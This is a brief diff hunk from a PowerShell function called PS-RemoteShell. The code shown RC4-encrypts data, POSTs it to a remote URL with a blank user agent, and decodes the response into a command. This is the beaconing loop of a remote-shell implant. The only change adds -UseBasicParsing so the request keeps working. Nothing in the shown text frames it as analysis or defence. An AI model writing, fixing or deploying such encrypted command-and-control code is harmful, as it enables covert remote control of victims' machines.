@@ -150,7 +150,7 @@ function PS-RemoteShell {
 			
 			$BodyData = RC4-EncodeBase64 -Buffer $BodyData -Key $Key
 			Try {
-				$Data = Invoke-WebRequest -Uri $Url -Method POST -Body $BodyData -UserAgent "" -TimeoutSec 10
+				$Data = Invoke-WebRequest -Uri $Url -Method POST -Body $BodyData -UserAgent "" -TimeoutSec 10 -UseBasicParsing
 				$Cmd = RC4-DecodeBase64 -Buffer $Data -Key $Key
 			} Catch {
 				$Cmd = ""
